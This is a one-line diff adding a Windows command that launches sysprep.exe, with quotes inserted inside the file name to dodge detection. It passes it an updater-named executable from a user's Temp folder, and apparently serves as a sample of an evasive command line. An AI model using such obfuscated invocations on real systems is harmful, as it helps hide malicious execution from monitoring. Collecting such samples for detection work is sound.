@@ -1,0 +1,1 @@
+C:\Windows\system32\sysprep\sy"spr"ep.exe C:\Users\admin\AppData\Local\Temp\gupdate.exe
